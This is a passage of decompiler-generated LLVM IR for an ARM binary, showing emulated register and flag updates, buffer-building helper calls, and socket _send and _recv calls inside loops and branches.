  br i1 %v9_984c, label %dec_label_pc_9924, label %dec_label_pc_9854

dec_label_pc_9854:                                ; preds = %dec_label_pc_9664
  store i32 35, i32* %r0.global-to-local, align 4
  %v1_9858 = call i32 @function_13ce8(i32 35)
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_9860 = call i32 @function_1460c(i8* %v1_9698)
  %v0_9864 = load i32, i32* @r5, align 4
  store i32 %v0_9864, i32* %r1.global-to-local, align 4
  store i32 %v2_9860, i32* @r4, align 4
  store i32 35, i32* %r0.global-to-local, align 4
  %v2_9870 = inttoptr i32 %v0_9864 to i32*
  %v3_9870 = call i32 @function_13c04(i32 35, i32* %v2_9870)
  store i32 %stack_var_-20856.0.ph, i32* %r2.global-to-local, align 4
  store i32 %v3_9870, i32* %r1.global-to-local, align 4
  %v1_987c = load i32, i32* @r4, align 4
  %v2_987c = add i32 %v1_987c, %stack_var_-20856.0.ph
  store i32 %v2_987c, i32* @r0, align 4
  %v2_9880 = inttoptr i32 %v2_987c to i8*
  %v3_9880 = call i32 @function_14634(i8* %v2_9880, i32 %v3_9870)
  store i32 35, i32* %r0.global-to-local, align 4
  %v1_9888 = call i32 @function_13c30(i32 35)
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_9890 = call i32 @function_1460c(i8* %v1_9698)
  store i32 %stack_var_-20856.0.ph, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_14f60.88 to i32), i32* %r1.global-to-local, align 4
  %v2_989c = add i32 %v2_9890, %stack_var_-20856.0.ph
  store i32 %v2_989c, i32* @r0, align 4
  %v3_98a0 = inttoptr i32 %v2_989c to i8*
  %v4_98a0 = call i32 @function_14634(i8* %v3_98a0, i32 ptrtoint ([3 x i8]* @global_var_14f60.88 to i32))
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_98a8 = call i32 @function_1460c(i8* %v1_9698)
  %v0_98ac = load i32, i32* @r5, align 4
  store i32 %v0_98ac, i32* %r1.global-to-local, align 4
  store i32 %v2_98a8, i32* %r4.global-to-local, align 4
  store i32 40, i32* %r0.global-to-local, align 4
  %v2_98b8 = inttoptr i32 %v0_98ac to i32*
  %v3_98b8 = call i32 @function_13c04(i32 40, i32* %v2_98b8)
  store i32 %stack_var_-20856.0.ph, i32* %ip.global-to-local, align 4
  store i32 %v3_98b8, i32* %r1.global-to-local, align 4
  %v2_98c4 = add i32 %v2_98a8, %stack_var_-20856.0.ph
  store i32 %v2_98c4, i32* @r0, align 4
  %v2_98c8 = inttoptr i32 %v2_98c4 to i8*
  %v3_98c8 = call i32 @function_14634(i8* %v2_98c8, i32 %v3_98b8)
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_98d0 = call i32 @function_1460c(i8* %v1_9698)
  store i32 %stack_var_-20856.0.ph, i32* %lr.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_14f64.82 to i32), i32* %r1.global-to-local, align 4
  %v2_98dc = add i32 %v2_98d0, %stack_var_-20856.0.ph
  store i32 %v2_98dc, i32* @r0, align 4
  %v2_98e0 = inttoptr i32 %v2_98dc to i8*
  %v3_98e0 = call i32 @function_14634(i8* %v2_98e0, i32 ptrtoint (i32* @global_var_14f64.82 to i32))
  store i32 %v6_8f58, i32* %r0.global-to-local, align 4
  %v2_98e8 = call i32 @function_1460c(i8* %v1_98e8)
  store i32 %v2_98e8, i32* @r4, align 4
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_98f4 = call i32 @function_1460c(i8* %v1_9698)
  %v2_98fc = add i32 %v2_98f4, %stack_var_-20856.0.ph
  store i32 %v2_98fc, i32* %r2.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v0_9904 = load i32, i32* @r4, align 4
  store i32 %v0_9904, i32* %r0.global-to-local, align 4
  %v3_9908 = trunc i32 %v0_9904 to i8
  %v4_9908 = call i32 @function_14b00(i8 %v3_9908, i32 10, i32 %v2_98fc)
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_9910 = call i32 @function_1460c(i8* %v1_9698)
  store i32 %stack_var_-20856.0.ph, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_14f60.88 to i32), i32* %r1.global-to-local, align 4
  %v2_991c = add i32 %v2_9910, %stack_var_-20856.0.ph
  store i32 %v2_991c, i32* @r0, align 4
  %v3_9920 = inttoptr i32 %v2_991c to i8*
  %v4_9920 = call i32 @function_14634(i8* %v3_9920, i32 ptrtoint ([3 x i8]* @global_var_14f60.88 to i32))
  store i32 %v4_9920, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9924

dec_label_pc_9924:                                ; preds = %dec_label_pc_9664, %dec_label_pc_9854
  %v0_9924 = load i32, i32* @r6, align 4
  %v1_9924 = add i32 %v0_9924, 37
  %v2_9924 = inttoptr i32 %v1_9924 to i32*
  %v3_9924 = load i32, i32* %v2_9924, align 4
  store i32 %v3_9924, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_9928 = icmp slt i32 %v3_9924, 0
  store i1 %v1_9928, i1* %cpsr_n.global-to-local, align 1
  %v2_9928 = icmp eq i32 %v3_9924, 0
  store i1 %v2_9928, i1* %cpsr_z.global-to-local, align 1
  %tmp208 = icmp slt i32 %v3_9924, 1
  br i1 %tmp208, label %dec_label_pc_99d0, label %dec_label_pc_9930

dec_label_pc_9930:                                ; preds = %dec_label_pc_9924
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_9934 = call i32 @function_1460c(i8* %v1_9698)
  store i32 %stack_var_-20856.0.ph, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_14f74.90 to i32), i32* %r1.global-to-local, align 4
  %v2_9940 = add i32 %v2_9934, %stack_var_-20856.0.ph
  store i32 %v2_9940, i32* @r0, align 4
  %v3_9944 = inttoptr i32 %v2_9940 to i8*
  %v4_9944 = call i32 @function_14634(i8* %v3_9944, i32 ptrtoint ([9 x i8]* @global_var_14f74.90 to i32))
  store i32 %v4_9944, i32* %r0.global-to-local, align 4
  %v0_9948 = load i32, i32* @r6, align 4
  %v1_9948 = add i32 %v0_9948, 37
  %v2_9948 = inttoptr i32 %v1_9948 to i32*
  %v3_9948 = load i32, i32* %v2_9948, align 4
  store i32 %v3_9948, i32* %r3.global-to-local, align 4
  store i32 %v10_9048, i32* %lr.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_9950 = icmp slt i32 %v3_9948, 0
  store i1 %v1_9950, i1* %cpsr_n.global-to-local, align 1
  %v2_9950 = icmp eq i32 %v3_9948, 0
  store i1 %v2_9950, i1* %cpsr_z.global-to-local, align 1
  %v0_9954 = load i32, i32* @r5, align 4
  store i32 %v0_9954, i32* %stack_var_-40, align 4
  %tmp209 = icmp slt i32 %v3_9948, 1
  br i1 %tmp209, label %dec_label_pc_99b8, label %dec_label_pc_995c

dec_label_pc_995c:                                ; preds = %dec_label_pc_9930, %dec_label_pc_995c
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_9960 = call i32 @function_1460c(i8* %v1_9698)
  store i32 %v10_9048, i32* %r2.global-to-local, align 4
  %v3_9968 = load i32, i32* %stack_var_-40, align 4
  store i32 %stack_var_-20856.0.ph, i32* %r3.global-to-local, align 4
  %v1_9970 = and i32 %v3_9968, 33554432
  %v2_9970 = icmp ne i32 %v1_9970, 0
  store i1 %v2_9970, i1* %cpsr_c.global-to-local, align 1
  %v3_9970 = mul i32 %v3_9968, 128
  %v1_9974 = add i32 %v3_9970, 1472
  %v2_9978 = add i32 %v2_9960, %stack_var_-20856.0.ph
  store i32 %v2_9978, i32* @r0, align 4
  %v0_997c = load i32, i32* @r7, align 4
  %v2_997c = add i32 %v1_9974, %v0_997c
  store i32 %v2_997c, i32* %r1.global-to-local, align 4
  %v2_9980 = inttoptr i32 %v2_9978 to i8*
  %v3_9980 = call i32 @function_14634(i8* %v2_9980, i32 %v2_997c)
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_9988 = call i32 @function_1460c(i8* %v1_9698)
  store i32 %stack_var_-20856.0.ph, i32* %ip.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_14f80.92 to i32), i32* %r1.global-to-local, align 4
  %v2_9994 = add i32 %v2_9988, %stack_var_-20856.0.ph
  store i32 %v2_9994, i32* @r0, align 4
  %v3_9998 = inttoptr i32 %v2_9994 to i8*
  %v4_9998 = call i32 @function_14634(i8* %v3_9998, i32 ptrtoint ([3 x i8]* @global_var_14f80.92 to i32))
  store i32 %v4_9998, i32* %r0.global-to-local, align 4
  store i32 %v10_9048, i32* %lr.global-to-local, align 4
  %v3_99a0 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_99a0, i32* %r3.global-to-local, align 4
  %v0_99a4 = load i32, i32* @r6, align 4
  %v1_99a4 = add i32 %v0_99a4, 37
  %v2_99a4 = inttoptr i32 %v1_99a4 to i32*
  %v3_99a4 = load i32, i32* %v2_99a4, align 4
  store i32 %v3_99a4, i32* %r2.global-to-local, align 4
  %v1_99a8 = add i32 %v3_99a0, 1
  store i32 %v1_99a8, i32* %ip.global-to-local, align 4
  %v2_99ac = sub i32 %v3_99a4, %v1_99a8
  %v3_99ac = icmp uge i32 %v3_99a4, %v1_99a8
  store i1 %v3_99ac, i1* %cpsr_c.global-to-local, align 1
  %v4_99ac = xor i32 %v3_99a4, %v1_99a8
  %v5_99ac = xor i32 %v2_99ac, %v3_99a4
  %v6_99ac = and i32 %v5_99ac, %v4_99ac
  %v7_99ac = icmp slt i32 %v6_99ac, 0
  store i1 %v7_99ac, i1* %cpsr_v.global-to-local, align 1
  %v8_99ac = icmp slt i32 %v2_99ac, 0
  store i1 %v8_99ac, i1* %cpsr_n.global-to-local, align 1
  %v9_99ac = icmp eq i32 %v3_99a4, %v1_99a8
  store i1 %v9_99ac, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_99a8, i32* %stack_var_-40, align 4
  %v8_99b4 = icmp sgt i32 %v3_99a4, %v1_99a8
  br i1 %v8_99b4, label %dec_label_pc_995c, label %dec_label_pc_99b8

dec_label_pc_99b8:                                ; preds = %dec_label_pc_995c, %dec_label_pc_9930
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_99bc = call i32 @function_1460c(i8* %v1_9698)
  %v2_99c4 = add i32 %v2_99bc, %stack_var_-20856.0.ph
  store i32 %v2_99c4, i32* @r0, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_14f60.88 to i32), i32* %r1.global-to-local, align 4
  %v3_99cc = inttoptr i32 %v2_99c4 to i8*
  %v4_99cc = call i32 @function_14634(i8* %v3_99cc, i32 ptrtoint ([3 x i8]* @global_var_14f60.88 to i32))
  store i32 %v4_99cc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_99d0

dec_label_pc_99d0:                                ; preds = %dec_label_pc_9924, %dec_label_pc_99b8
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_99d4 = call i32 @function_1460c(i8* %v1_9698)
  store i32 %stack_var_-20856.0.ph, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_14f60.88 to i32), i32* %r1.global-to-local, align 4
  %v2_99e0 = add i32 %v2_99d4, %stack_var_-20856.0.ph
  store i32 %v2_99e0, i32* @r0, align 4
  %v3_99e4 = inttoptr i32 %v2_99e0 to i8*
  %v4_99e4 = call i32 @function_14634(i8* %v3_99e4, i32 ptrtoint ([3 x i8]* @global_var_14f60.88 to i32))
  store i32 %v4_99e4, i32* %r0.global-to-local, align 4
  store i32 %v6_8f58, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 %v1_99ec, i1* %cpsr_n.global-to-local, align 1
  store i1 %v2_99ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_99ec, label %dec_label_pc_9a0c, label %dec_label_pc_99f4

dec_label_pc_99f4:                                ; preds = %dec_label_pc_99d0
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_99f8 = call i32 @function_1460c(i8* %v1_9698)
  store i32 %stack_var_-20856.0.ph, i32* %ip.global-to-local, align 4
  store i32 %v6_8f58, i32* %r1.global-to-local, align 4
  %v2_9a04 = add i32 %v2_99f8, %stack_var_-20856.0.ph
  store i32 %v2_9a04, i32* @r0, align 4
  %v2_9a08 = inttoptr i32 %v2_9a04 to i8*
  %v3_9a08 = call i32 @function_14634(i8* %v2_9a08, i32 %v6_8f58)
  store i32 %v3_9a08, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9a0c

dec_label_pc_9a0c:                                ; preds = %dec_label_pc_99d0, %dec_label_pc_99f4
  %v0_9a0c = load i32, i32* @r7, align 4
  %v1_9a0c = add i32 %v0_9a0c, 1440
  store i32 %v1_9a0c, i32* %r4.global-to-local, align 4
  %v0_9a10 = load i32, i32* @r6, align 4
  store i32 %v0_9a10, i32* %r0.global-to-local, align 4
  store i32 %v1_9a0c, i32* %r1.global-to-local, align 4
  %v2_9a18 = inttoptr i32 %v0_9a10 to i8*
  %v3_9a18 = call i32 @function_149ec(i8* %v2_9a18, i32 %v1_9a0c)
  store i32 %v3_9a18, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_9a1c = icmp slt i32 %v3_9a18, 0
  store i1 %v1_9a1c, i1* %cpsr_n.global-to-local, align 1
  %v2_9a1c = icmp eq i32 %v3_9a18, 0
  store i1 %v2_9a1c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9a1c, label %dec_label_pc_a364, label %dec_label_pc_9a24

dec_label_pc_9a24:                                ; preds = %dec_label_pc_9a0c, %dec_label_pc_a364
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v0_9a28 = load i32, i32* @r6, align 4
  %v1_9a28 = add i32 %v0_9a28, -1431
  %v2_9a28 = inttoptr i32 %v1_9a28 to i32*
  %v3_9a28 = load i32, i32* %v2_9a28, align 4
  store i32 %v3_9a28, i32* @r4, align 4
  %v2_9a2c = call i32 @function_1460c(i8* %v1_9698)
  store i32 %stack_var_-20856.0.ph, i32* %r1.global-to-local, align 4
  store i32 %v2_9a2c, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_9a3c = load i32, i32* @r4, align 4
  store i32 %v0_9a3c, i32* %r0.global-to-local, align 4
  %v4_9a40 = call i32 @_send(i32 %v0_9a3c, i32 %stack_var_-20856.0.ph, i32 %v2_9a2c, i32 16384)
  store i32 %v4_9a40, i32* %r0.global-to-local, align 4
  %v0_9a44 = load i32, i32* @r6, align 4
  %v1_9a44 = add i32 %v0_9a44, -1431
  %v2_9a44 = inttoptr i32 %v1_9a44 to i32*
  %v3_9a44 = load i32, i32* %v2_9a44, align 4
  store i32 %v3_9a44, i32* %r0.global-to-local, align 4
  %v3_9a4c = udiv i32 %v3_9a44, 32
  %v3_9a50 = mul nuw nsw i32 %v3_9a4c, 4
  store i32 %v2_94a0, i32* %lr.global-to-local, align 4
  %v2_9a58 = add i32 %v3_9a50, %v2_94a0
  store i32 %v2_9a58, i32* %r3.global-to-local, align 4
  %v1_9a5c = add i32 %v2_9a58, -164
  %v2_9a5c = inttoptr i32 %v1_9a5c to i32*
  %v3_9a5c = load i32, i32* %v2_9a5c, align 4
  %v1_9a60 = urem i32 %v3_9a44, 32
  %v1_9a64 = load i32, i32* %fp.global-to-local, align 4
  %v7_9a64 = shl i32 %v1_9a64, %v1_9a60
  %v8_9a64 = or i32 %v7_9a64, %v3_9a5c
  store i32 %v8_9a64, i32* %r2.global-to-local, align 4
  %v0_9a68 = load i32, i32* @sl, align 4
  %v2_9a68 = sub i32 %v0_9a68, %v3_9a44
  %v3_9a68 = icmp uge i32 %v0_9a68, %v3_9a44
  store i1 %v3_9a68, i1* %cpsr_c.global-to-local, align 1
  %v4_9a68 = xor i32 %v0_9a68, %v3_9a44
  %v5_9a68 = xor i32 %v2_9a68, %v0_9a68
  %v6_9a68 = and i32 %v5_9a68, %v4_9a68
  %v7_9a68 = icmp slt i32 %v6_9a68, 0
  store i1 %v7_9a68, i1* %cpsr_v.global-to-local, align 1
  %v8_9a68 = icmp slt i32 %v2_9a68, 0
  store i1 %v8_9a68, i1* %cpsr_n.global-to-local, align 1
  %v9_9a68 = icmp eq i32 %v0_9a68, %v3_9a44
  store i1 %v9_9a68, i1* %cpsr_z.global-to-local, align 1
  store i32 6, i32* %r1.global-to-local, align 4
  store i32 %v8_9a64, i32* %v2_9a5c, align 4
  %v0_9a74 = load i32, i32* %sb.global-to-local, align 4
  %v1_9a74 = load i32, i32* @r6, align 4
  %v2_9a74 = add i32 %v1_9a74, -1419
  %v3_9a74 = inttoptr i32 %v2_9a74 to i32*
  store i32 %v0_9a74, i32* %v3_9a74, align 4
  %v0_9a78 = load i32, i32* %r1.global-to-local, align 4
  %v1_9a78 = trunc i32 %v0_9a78 to i8
  %v2_9a78 = load i32, i32* @r6, align 4
  %v3_9a78 = add i32 %v2_9a78, -1427
  %v4_9a78 = inttoptr i32 %v3_9a78 to i8*
  store i8 %v1_9a78, i8* %v4_9a78, align 1
  %v0_9a7c = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_9a7c = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_9a7c = xor i1 %v0_9a7c, %v1_9a7c
  br i1 %v2_9a7c, label %dec_label_pc_9a80, label %dec_label_pc_9388

dec_label_pc_9a80:                                ; preds = %dec_label_pc_9a24
  %v0_9a80 = load i32, i32* %r0.global-to-local, align 4
  %v1_9a80 = add i32 %v0_9a80, 1
  store i32 %v1_9a80, i32* @sl, align 4
  br label %dec_label_pc_94c4

dec_label_pc_9a88:                                ; preds = %dec_label_pc_9360
  %v1_9a88 = add i32 %v3_9658, -1431
  %v2_9a88 = inttoptr i32 %v1_9a88 to i32*
  %v3_9a88 = load i32, i32* %v2_9a88, align 4
  store i32 %v3_9a88, i32* %r0.global-to-local, align 4
  %v3_9a90 = udiv i32 %v3_9a88, 32
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v3_9a94 = mul nuw nsw i32 %v3_9a90, 4
  store i32 %v2_94a0, i32* %ip.global-to-local, align 4
  %v2_9a9c = add i32 %v3_9a94, %v2_94a0
  store i32 %v2_9a9c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_9aa0

dec_label_pc_9aa0:                                ; preds = %.thread24, %.thread35, %dec_label_pc_9a88
  %v1_9aac = phi i32 [ %v4_9344, %.thread35 ], [ %v4_9324, %.thread24 ], [ %v3_9a88, %dec_label_pc_9a88 ]
  %v1_9ab0 = phi i32 [ %v3_9358, %.thread35 ], [ %v3_9338, %.thread24 ], [ %v2_9a9c, %dec_label_pc_9a88 ]
  %v1_9aa0 = add i32 %v1_9ab0, -164
  %v2_9aa0 = inttoptr i32 %v1_9aa0 to i32*
  %v3_9aa0 = load i32, i32* %v2_9aa0, align 4
  %v1_9aa4 = urem i32 %v1_9aac, 32
  store i32 %v1_9aa4, i32* %r1.global-to-local, align 4
  %v1_9aa8 = load i32, i32* %fp.global-to-local, align 4
  %v7_9aa8 = shl i32 %v1_9aa8, %v1_9aa4
  %v8_9aa8 = or i32 %v7_9aa8, %v3_9aa0
  store i32 %v8_9aa8, i32* %r2.global-to-local, align 4
  %v0_9aac = load i32, i32* @sl, align 4
  %v2_9aac = sub i32 %v0_9aac, %v1_9aac
  %v3_9aac = icmp uge i32 %v0_9aac, %v1_9aac
  store i1 %v3_9aac, i1* %cpsr_c.global-to-local, align 1
  %v4_9aac = xor i32 %v0_9aac, %v1_9aac
  %v5_9aac = xor i32 %v2_9aac, %v0_9aac
  %v6_9aac = and i32 %v5_9aac, %v4_9aac
  %v7_9aac = icmp slt i32 %v6_9aac, 0
  store i1 %v7_9aac, i1* %cpsr_v.global-to-local, align 1
  %v8_9aac = icmp slt i32 %v2_9aac, 0
  store i1 %v8_9aac, i1* %cpsr_n.global-to-local, align 1
  %v9_9aac = icmp eq i32 %v0_9aac, %v1_9aac
  store i1 %v9_9aac, i1* %cpsr_z.global-to-local, align 1
  store i32 %v8_9aa8, i32* %v2_9aa0, align 4
  %v2_9ab4 = xor i1 %v8_9aac, %v7_9aac
  br i1 %v2_9ab4, label %dec_label_pc_9ab8, label %dec_label_pc_9388

dec_label_pc_9ab8:                                ; preds = %dec_label_pc_9aa0
  %v0_9ab8 = load i32, i32* %r0.global-to-local, align 4
  %v1_9ab8 = add i32 %v0_9ab8, 1
  store i32 %v1_9ab8, i32* @sl, align 4
  br label %dec_label_pc_94c4

dec_label_pc_9ac0:                                ; preds = %dec_label_pc_9310
  %v1_9ac0 = add i32 %v3_9658, -1423
  %v2_9ac0 = inttoptr i32 %v1_9ac0 to i32*
  %v3_9ac0 = load i32, i32* %v2_9ac0, align 4
  %v1_9ac4 = load i32, i32* %sb.global-to-local, align 4
  %v2_9ac4 = sub i32 %v1_9ac4, %v3_9ac0
  store i32 %v2_9ac4, i32* %r3.global-to-local, align 4
  %v1_9ac8 = add i32 %v2_9ac4, -30
  %v2_9ac8 = icmp ugt i32 %v2_9ac4, 29
  store i1 %v2_9ac8, i1* %cpsr_c.global-to-local, align 1
  %v3_9ac8 = sub i32 29, %v2_9ac4
  %v4_9ac8 = and i32 %v3_9ac8, %v2_9ac4
  %v5_9ac8 = icmp slt i32 %v4_9ac8, 0
  store i1 %v5_9ac8, i1* %cpsr_v.global-to-local, align 1
  %v6_9ac8 = icmp slt i32 %v1_9ac8, 0
  store i1 %v6_9ac8, i1* %cpsr_n.global-to-local, align 1
  %v7_9ac8 = icmp eq i32 %v2_9ac4, 30
  store i1 %v7_9ac8, i1* %cpsr_z.global-to-local, align 1
  %v2_9acc = xor i1 %v7_9ac8, true
  %v3_9acc = and i1 %v2_9ac8, %v2_9acc
  br i1 %v3_9acc, label %dec_label_pc_9370, label %dec_label_pc_9ad0

dec_label_pc_9ad0:                                ; preds = %dec_label_pc_9ac0
  %v1_9ad0 = add i32 %v3_9658, -1431
  %v2_9ad0 = inttoptr i32 %v1_9ad0 to i32*
  %v3_9ad0 = load i32, i32* %v2_9ad0, align 4
  store i32 %v3_9ad0, i32* %r0.global-to-local, align 4
  %v3_9ad8 = udiv i32 %v3_9ad0, 32
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v3_9adc = mul nuw nsw i32 %v3_9ad8, 4
  store i32 %v3_9adc, i32* %r3.global-to-local, align 4
  store i32 %v2_94a0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_94a8

dec_label_pc_9b28:                                ; preds = %dec_label_pc_9574
  store i32 %v2_8fd8, i32* %r0.global-to-local, align 4
  store i32 10240, i32* %r1.global-to-local, align 4
  %v2_9b30 = call i32 @function_146ac(i32 %v2_8fd8, i32 10240)
  store i32 %v2_9b30, i32* %r0.global-to-local, align 4
  store i32 16386, i32* %r3.global-to-local, align 4
  %v0_9b3c = load i32, i32* @r8, align 4
  %v1_9b3c = add i32 %v0_9b3c, -1456
  %v2_9b3c = inttoptr i32 %v1_9b3c to i32*
  %v3_9b3c = load i32, i32* %v2_9b3c, align 4
  store i32 %v3_9b3c, i32* %r0.global-to-local, align 4
  store i32 %v2_8fd8, i32* %r1.global-to-local, align 4
  store i32 10240, i32* %r2.global-to-local, align 4
  %v4_9b48 = call i32 @_recv(i32 %v3_9b3c, i32 %v2_8fd8, i32 10240, i32 16386)
  store i32 %v4_9b48, i32* %r0.global-to-local, align 4
  store i32 %v4_9b48, i32* %fp.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_9b50 = icmp slt i32 %v4_9b48, 0
  store i1 %v1_9b50, i1* %cpsr_n.global-to-local, align 1
  %v2_9b50 = icmp eq i32 %v4_9b48, 0
  store i1 %v2_9b50, i1* %cpsr_z.global-to-local, align 1
  store i32 -20773, i32* @r6, align 4
  %tmp210 = icmp slt i32 %v4_9b48, 1
  br i1 %tmp210, label %dec_label_pc_a7d4, label %dec_label_pc_9b5c

dec_label_pc_9b5c:                                ; preds = %dec_label_pc_9b28
  store i32 %v2_8fd8, i32* %r0.global-to-local, align 4
  store i32 %v4_9b48, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_14f84.94 to i32), i32* %r2.global-to-local, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  %v5_9b6c = call i32 @function_146d0(i32 %v2_8fd8, i32 %v4_9b48, i32 ptrtoint ([5 x i8]* @global_var_14f84.94 to i32), i32 4)
  store i32 %v5_9b6c, i32* %r0.global-to-local, align 4
  %v1_9b70 = add i32 %v5_9b6c, 1
  %v2_9b70 = icmp eq i32 %v5_9b6c, -1
  store i1 %v2_9b70, i1* %cpsr_c.global-to-local, align 1
  %v3_9b70 = sub i32 0, %v5_9b6c
  %v4_9b70 = and i32 %v1_9b70, %v3_9b70
  %v5_9b70 = icmp slt i32 %v4_9b70, 0
  store i1 %v5_9b70, i1* %cpsr_v.global-to-local, align 1
  %v6_9b70 = icmp slt i32 %v1_9b70, 0
  store i1 %v6_9b70, i1* %cpsr_n.global-to-local, align 1
  %v7_9b70 = icmp eq i32 %v1_9b70, 0
  store i1 %v7_9b70, i1* %cpsr_z.global-to-local, align 1
  %v0_a66c = load i32, i32* %fp.global-to-local, align 4
  br i1 %v7_9b70, label %dec_label_pc_a66c, label %dec_label_pc_9b78

dec_label_pc_9b78:                                ; preds = %dec_label_pc_9b5c, %dec_label_pc_a66c
  store i32 ptrtoint ([5 x i8]* @global_var_14f84.94 to i32), i32* %r2.global-to-local, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  store i32 %v0_a66c, i32* %r1.global-to-local, align 4
  store i32 %v2_8fd8, i32* %r0.global-to-local, align 4
  %v5_9b88 = call i32 @function_146d0(i32 %v2_8fd8, i32 %v0_a66c, i32 ptrtoint ([5 x i8]* @global_var_14f84.94 to i32), i32 4)
  store i32 %v2_94a0, i32* %ip.global-to-local, align 4
  %v2_9b94 = add i32 %v5_9b88, %v2_94a0
  store i32 %v2_9b94, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  %v3_9b9c = load i32, i32* @r6, align 4
  %v4_9b9c = add i32 %v3_9b9c, %v2_9b94
  %v5_9b9c = inttoptr i32 %v4_9b9c to i8*
  store i8 0, i8* %v5_9b9c, align 1
  %v0_9ba0 = load i32, i32* @r5, align 4
  store i32 %v0_9ba0, i32* %r1.global-to-local, align 4
  store i32 46, i32* %r0.global-to-local, align 4
  %v2_9ba8 = inttoptr i32 %v0_9ba0 to i32*
  %v3_9ba8 = call i32 @function_13c04(i32 46, i32* %v2_9ba8)
  %v0_9bac = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_9bac, i32* @r1, align 4
  store i32 %v3_9ba8, i32* %r2.global-to-local, align 4
  store i32 %v2_8fd8, i32* %r0.global-to-local, align 4
  %v4_9bb8 = call i32 @function_14960(i8* %tmp199, i32 %v0_9bac, i32 %v3_9ba8)
  store i32 %v4_9bb8, i32* %r0.global-to-local, align 4
  %v1_9bbc = add i32 %v4_9bb8, 1
  %v2_9bbc = icmp eq i32 %v4_9bb8, -1
  store i1 %v2_9bbc, i1* %cpsr_c.global-to-local, align 1
  %v3_9bbc = sub i32 0, %v4_9bb8
  %v4_9bbc = and i32 %v1_9bbc, %v3_9bbc
  %v5_9bbc = icmp slt i32 %v4_9bbc, 0
  store i1 %v5_9bbc, i1* %cpsr_v.global-to-local, align 1
  %v6_9bbc = icmp slt i32 %v1_9bbc, 0
  store i1 %v6_9bbc, i1* %cpsr_n.global-to-local, align 1
  %v7_9bbc = icmp eq i32 %v1_9bbc, 0
  store i1 %v7_9bbc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9bbc, label %.thread45, label %bb211

bb211:                                            ; preds = %dec_label_pc_9b78
  store i32 2, i32* %r3.global-to-local, align 4
  %v2_9bc4 = load i32, i32* @r8, align 4
  %v3_9bc4 = add i32 %v2_9bc4, -4
  %v4_9bc4 = inttoptr i32 %v3_9bc4 to i32*
  store i32 2, i32* %v4_9bc4, align 4
  br label %.thread45

.thread45:                                        ; preds = %dec_label_pc_9b78, %bb211
  %v0_9bc8 = load i32, i32* @r5, align 4
  store i32 %v0_9bc8, i32* %r1.global-to-local, align 4
  store i32 45, i32* %r0.global-to-local, align 4
  %v2_9bd0 = inttoptr i32 %v0_9bc8 to i32*
  %v3_9bd0 = call i32 @function_13c04(i32 45, i32* %v2_9bd0)
  %v0_9bd4 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_9bd4, i32* @r1, align 4
  store i32 %v3_9bd0, i32* %r2.global-to-local, align 4
  store i32 %v2_8fd8, i32* %r0.global-to-local, align 4
  %v4_9be0 = call i32 @function_14960(i8* %tmp199, i32 %v0_9bd4, i32 %v3_9bd0)
  store i32 %v4_9be0, i32* %r0.global-to-local, align 4
  %v1_9be4 = add i32 %v4_9be0, 1
  %v2_9be4 = icmp eq i32 %v4_9be0, -1
  store i1 %v2_9be4, i1* %cpsr_c.global-to-local, align 1
  %v3_9be4 = sub i32 0, %v4_9be0
  %v4_9be4 = and i32 %v1_9be4, %v3_9be4
